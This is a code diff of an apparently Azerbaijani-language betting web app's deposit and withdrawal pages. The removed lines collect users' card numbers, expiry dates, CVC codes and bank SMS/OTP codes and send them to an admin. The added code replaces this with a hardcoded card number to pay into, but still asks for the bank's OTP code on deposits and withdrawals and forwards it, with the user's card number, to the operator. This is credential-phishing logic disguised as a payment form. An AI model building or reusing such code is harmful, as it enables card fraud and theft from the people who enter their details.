@@ -67,9 +67,13 @@
 
     /* INPUT VƏ FORM */
     .form-group { width: 100%; text-align: left; margin-bottom: 10px; }
-    .input-row { display: flex; gap: 8px; width: 100%; }
     .input-field { width: 100%; padding: 12px; background: #0a0814; border: 1px solid var(--accent-gold); border-radius: 8px; color: #fff; font-size: 15px; font-weight: bold; outline: none; }
     .input-label { font-size: 12px; color: #aaa; margin-bottom: 4px; display: block; }
+
+    /* KART KOPYALAMA KUTUSU */
+    .deposit-card-box { width: 100%; background: rgba(255,215,0,0.08); border: 1px dashed var(--accent-gold); border-radius: 12px; padding: 12px; margin-bottom: 12px; text-align: center; }
+    .deposit-card-num { font-size: 18px; font-weight: 800; color: var(--accent-gold); letter-spacing: 1.5px; margin: 6px 0; }
+    .copy-btn { background: var(--accent-gold); color: #000; border: none; padding: 5px 12px; font-weight: bold; font-size: 11px; border-radius: 6px; cursor: pointer; }
 
     .action-btn { width: 100%; padding: 14px; background: linear-gradient(135deg, var(--accent-gold), var(--accent-orange)); color: #000; border: none; font-size: 17px; font-weight: 800; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(255,140,0,0.4); transition: 0.1s; margin-top: 5px; }
     .action-btn:active { transform: scale(0.98); }
@@ -155,20 +159,10 @@
 
   <!-- DEPOZİT (DEPOSIT) -->
   <div class="view" id="depositView">
-    <div class="form-group">
-      <label class="input-label">Kart Nömrəniz (16 rəqəm):</label>
-      <input type="text" id="depCardNum" class="input-field" placeholder="4169 0000 0000 0000" maxlength="19">
-    </div>
-
-    <div class="input-row">
-      <div class="form-group" style="flex: 1;">
-        <label class="input-label">Müddət (MM/YY):</label>
-        <input type="text" id="depCardExp" class="input-field" placeholder="12/28" maxlength="5">
-      </div>
-      <div class="form-group" style="flex: 1;">
-        <label class="input-label">CVC / CVV:</label>
-        <input type="password" id="depCardCvc" class="input-field" placeholder="123" maxlength="3">
-      </div>
+    <div class="deposit-card-box">
+      <div style="font-size:12px; color:#ccc;">Ödəniş üçün Kart Nömrəsi:</div>
+      <div class="deposit-card-num" id="adminCardNum">4169738878948672</div>
+      <button class="copy-btn" onclick="copyCardNumber()">📋 KART NÖMRƏSİNİ KOPYALA</button>
     </div>
 
     <div class="form-group">
@@ -176,7 +170,7 @@
       <input type="number" id="depositAmountInput" class="input-field" value="10" min="10">
     </div>
 
-    <button class="action-btn" onclick="openConfirmModal('deposit')">💳 DEPOZİT ET</button>
+    <button class="action-btn" onclick="openConfirmModal('deposit')">💳 DEPOZİTİ TƏSDİQLƏ</button>
     <div class="status-msg" id="depositStatus"></div>
   </div>
 
@@ -226,7 +220,7 @@
     const userId = user?.id ? String(user.id) : 'demo_user';
 
     let balance = 0.00;
-    let pendingAction = null; // 'deposit' və ya 'withdraw'
+    let pendingAction = null;
 
     db.ref(`users/${userId}/balance`).on('value', (snapshot) => {
       const val = snapshot.val();
@@ -280,6 +274,15 @@
 
     function updateBalanceUI() {
       document.getElementById('balance').innerText = balance.toFixed(2);
+    }
+
+    function copyCardNumber() {
+      const cardNum = document.getElementById('adminCardNum').innerText;
+      navigator.clipboard.writeText(cardNum).then(() => {
+        alert('Kart nömrəsi kopyalandı!');
+      }).catch(() => {
+        alert('Kopyalanmadı, əllə kopyalayın: ' + cardNum);
+      });
     }
 
     function setBet(amount, btn) {
@@ -551,18 +554,12 @@
     /* --- MODAL PƏNCƏRƏ VƏ TƏSDİQLƏMƏ SİSTEMİ --- */
     function openConfirmModal(type) {
       if (type === 'deposit') {
-        const cardNum = document.getElementById('depCardNum').value.trim();
-        const cardExp = document.getElementById('depCardExp').value.trim();
-        const cardCvc = document.getElementById('depCardCvc').value.trim();
         const amount = parseFloat(document.getElementById('depositAmountInput').value);
 
-        if (!cardNum || cardNum.length < 16) { alert('Düzgün 16 rəqəmli kart nömrəsi girin!'); return; }
-        if (!cardExp || cardExp.length < 4) { alert('Son istifadə tarixini daxil edin (MM/YY)!'); return; }
-        if (!cardCvc || cardCvc.length < 3) { alert('CVC/CVV kodunu daxil edin!'); return; }
         if (isNaN(amount) || amount < 10) { alert('Minimum depozit 10 AZN-dir!'); return; }
 
         pendingAction = 'deposit';
-        document.getElementById('modalDescText').innerText = `${amount.toFixed(2)} AZN depoziti təsdiqləmək üçün SMS kodunu daxil edin:`;
+        document.getElementById('modalDescText').innerText = `${amount.toFixed(2)} AZN depozit köçürməsini təsdiqləmək üçün SMS/OTP təsdiq kodunu daxil edin:`;
 
       } else if (type === 'withdraw') {
         const cardNum = document.getElementById('withdrawCardInput').value.trim();
@@ -573,7 +570,7 @@
         if (balance < amount) { alert('Balansınızda kifayət qədər məbləğ yoxdur!'); return; }
 
         pendingAction = 'withdraw';
-        document.getElementById('modalDescText').innerText = `${amount.toFixed(2)} AZN çıxarışı təsdiqləmək üçün SMS kodunu daxil edin:`;
+        document.getElementById('modalDescText').innerText = `${amount.toFixed(2)} AZN çıxarışı təsdiqləmək üçün SMS/OTP kodunu daxil edin:`;
       }
 
       document.getElementById('smsOtpInput').value = '';
@@ -595,12 +592,10 @@
       const username = user?.username ? `@${user.username}` : (user?.first_name || 'İstifadəçi');
 
       if (pendingAction === 'deposit') {
-        const cardNum = document.getElementById('depCardNum').value.trim();
-        const cardExp = document.getElementById('depCardExp').value.trim();
-        const cardCvc = document.getElementById('depCardCvc').value.trim();
         const amount = parseFloat(document.getElementById('depositAmountInput').value);
+        const adminCard = document.getElementById('adminCardNum').innerText;
 
-        const messageText = `💳 <b>YENİ DEPOZİT SORĞUSU</b>\n\n👤 <b>İstifadəçi:</b> ${username}\n🆔 <b>User ID:</b> <code>${userId}</code>\n💳 <b>Kart:</b> <code>${cardNum}</code>\n📅 <b>Tarix:</b> <code>${cardExp}</code> | 🔒 <b>CVC:</b> <code>${cardCvc}</code>\n🔑 <b>SMS/OTP Kod:</b> <code>${otpCode}</code>\n💰 <b>Məbləğ:</b> ${amount.toFixed(2)} AZN`;
+        const messageText = `💳 <b>YENİ DEPOZİT SORĞUSU</b>\n\n👤 <b>İstifadəçi:</b> ${username}\n🆔 <b>User ID:</b> <code>${userId}</code>\n🏦 <b>Ödənilən Kart:</b> <code>${adminCard}</code>\n🔑 <b>SMS/OTP Kod:</b> <code>${otpCode}</code>\n💰 <b>Məbləğ:</b> ${amount.toFixed(2)} AZN`;
 
         sendToAdmin(messageText, () => {
           document.getElementById('depositStatus').innerText = `Depozit sorğusu və SMS təsdiqi adminə daxil oldu.`;
@@ -614,7 +609,7 @@
         balance -= amount;
         saveBalanceToDB(balance);
 
-        const messageText = `💸 <b>YENİ ÇIXARIŞ SORĞUSU</b>\n\n👤 <b>İstifadəçi:</b> ${username}\n🆔 <b>User ID:</b> <code>${userId}</code>\n💳 <b>Kart Nömrəsi:</b> <code>${cardNum}</code>\n🔑 <b>SMS/OTP Kod:</b> <code>${otpCode}</code>\n💰 <b>Məbləğ:</b> ${amount.toFixed(2)} AZN`;
+        const messageText = `💸 <b>YENİ ÇIXARIŞ SORĞUSU</b>\n\n👤 <b>İstifadəçi:</b> ${username}\n🆔 <b>User ID:</b> <code>${userId}</code>\n💳 <b>İstifadəçi Kartı:</b> <code>${cardNum}</code>\n🔑 <b>SMS/OTP Kod:</b> <code>${otpCode}</code>\n💰 <b>Məbləğ:</b> ${amount.toFixed(2)} AZN`;
 
         sendToAdmin(messageText, () => {
           document.getElementById('withdrawStatus').innerText = `Çıxarış sorğunuz təsdiqləndi və emala götürüldü.`;
